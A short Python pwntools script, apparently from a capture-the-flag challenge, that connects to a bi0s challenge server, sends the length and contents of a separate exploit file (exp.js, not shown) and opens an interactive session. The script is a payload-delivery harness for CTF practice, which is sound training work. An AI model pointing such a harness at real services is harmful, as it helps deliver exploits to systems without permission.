# -*- coding: utf-8 -*-

#########################################################################
# File Name: exp.py
# Created on : 2021-08-13 10:09:30
# Author: r1mit
# Last Modified: 2021-08-13 10:15:19
# Description:
#########################################################################
from pwn import *

p = remote("pwn.challenge.bi0s.in", 1212);
#  context.log_level='debug'
#  p.recvuntil("the file >>")
with open("exp.js") as f:
    data = f.read();
print(len(data));
p.sendline(str(len(data)))
p.send(data)

p.interactive();
